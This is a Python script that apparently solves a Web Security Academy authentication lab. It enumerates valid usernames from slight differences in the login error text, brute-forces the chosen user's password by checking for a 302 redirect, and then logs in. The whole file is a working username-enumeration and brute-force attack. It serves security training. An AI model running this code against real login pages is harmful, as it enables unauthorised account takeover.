from web_security_academy.core.utils import (
    auth_lab_usernames,
    auth_lab_passwords,
    print_info,
    print_info_secondary,
    print_success,
    print_fail,
)
from bs4 import BeautifulSoup


def solve_lab(session):
    usernames = auth_lab_usernames()
    passwords = auth_lab_passwords()
    print()

    # User enumeration
    print_info("Enumerating users by examining login form response...")
    for user in usernames:
        data = {"username": user, "password": "IncorrectPassword"}
        resp = session.post_path("/login", data=data)
        soup = BeautifulSoup(resp.text, "lxml")
        query = soup.select_one("p.is-warning")

        if query is None:
            print_fail("Unable to extract login form response.")
        else:
            warning = query.text

        # The period is important!
        if warning == "Invalid username or password.":
            print_info_secondary(f"{user} => {warning}", end="\x1b[1K")
        else:
            print_success(f"{user} => {warning}\n")
            break
    else:
        print_fail("Unable to enumerate a valid username.")

    # Password enumeration
    print_info(f"Brute-forcing {user}'s password...")
    for password in passwords:
        data = {"username": user, "password": password}
        resp = session.post_path("/login", data=data, allow_redirects=False)

        if resp.status_code != 302:
            print_info_secondary(f"{password} => {warning}", end="\x1b[1K")
        else:
            print_success(f"{password} => Correct!\n")
            break
    else:
        print_fail(f"Unable to brute-force {user}'s password.")

    session.login(user, password, with_csrf=False)
